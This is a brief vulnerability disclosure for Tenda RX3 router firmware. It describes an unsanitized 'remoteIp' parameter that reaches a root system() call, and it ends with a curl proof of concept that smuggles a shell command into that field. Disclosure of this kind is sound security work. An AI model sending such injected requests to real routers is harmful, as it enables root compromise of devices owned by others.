| Firmware Name | Firmware Version    | Download Link |
| ------------- | ------------------- | ------------- |
| RX3           | V16.03.13.11_multi  | https://static.tenda.com.cn/tdeweb/download/RX3/US_RX3V1.0br_V16.03.13.11_multi_TDE01.zip |

## Analysis

In the httpd binary, the function `formSetSafeWanWebMan` handles requests to `/goform/SetRemoteWebCfg`. The `remoteIp` parameter is stored in NVRAM (`wans.wanwebip`) without sanitization. The `netctrl` binary later reads this value and passes it to `doSystemCmd("iptables ... -s %s ...")`, which calls `system()`, allowing arbitrary command execution as root.

![Ghidra showing unsanitized remoteIp stored in NVRAM](screenshots/1.png)

## POC

```
curl -i -X POST http://192.168.0.1/goform/SetRemoteWebCfg -d "remoteWebEn=1&remoteIp=1.2.3.4;id>/tmp/pwned&remotePort=8080"
```

![Handler accepts injected payload](screenshots/2.png)
